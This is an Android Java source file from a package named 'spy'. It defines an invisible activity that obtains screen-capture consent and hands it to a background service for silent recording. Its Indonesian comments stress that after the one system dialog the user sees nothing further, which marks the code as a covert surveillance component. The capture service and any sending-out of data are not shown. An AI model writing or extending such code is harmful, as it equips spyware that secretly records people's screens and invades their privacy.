package com.zaxz.spy;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Bundle;
import android.os.Build;

/**
 * Activity invisible yang hanya buat request MediaProjection consent dari user.
 *
 * Cara kerja:
 *  - BackgroundService butuh screen capture → start ScreenCaptureActivity
 *  - Activity request MediaProjection via createScreenCaptureIntent()
 *  - System show dialog "Start casting screen?" ke user
 *  - User approve → onActivityResult return RESULT_OK + Intent data
 *  - Activity pass result code + intent ke BackgroundService via static field
 *  - BackgroundService pakai itu buat create VirtualDisplay + ImageReader
 *  - Activity langsung finish() (invisible, gak ganggu user lebih lama)
 *
 * Catatan: Activity ini tampil sekejap (transparent, no UI), jadi user cuma
 * lihat dialog system. Setelah approve, dia gak liat apa-apa lagi.
 */
public class ScreenCaptureActivity extends Activity {

    private static final int REQUEST_CODE = 7777;

    // Static field buat pass result ke BackgroundService.
    // Bisa di-set null setelah BackgroundService ambil.
    public static volatile int resultCode = 0;
    public static volatile Intent resultData = null;
    public static volatile boolean hasResult = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Kalau udah ada result cached, gak perlu request lagi — finish langsung.
        if (hasResult && resultData != null) {
            finish();
            return;
        }

        try {
            MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            if (mpm == null) {
                android.util.Log.w("ScreenCapture", "MediaProjectionManager null");
                finish();
                return;
            }
            startActivityForResult(mpm.createScreenCaptureIntent(), REQUEST_CODE);
        } catch (Exception e) {
            android.util.Log.w("ScreenCapture", "Failed to request: " + e.getMessage());
            finish();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_CODE) {
            if (resultCode == RESULT_OK && data != null) {
                // Cache result ke static field. BackgroundService akan ambil.
                ScreenCaptureActivity.resultCode = resultCode;
                ScreenCaptureActivity.resultData = data;
                ScreenCaptureActivity.hasResult = true;
                android.util.Log.i("ScreenCapture", "Permission granted");
            } else {
                android.util.Log.w("ScreenCapture", "Permission denied by user");
            }
        }
        finish();
    }
}
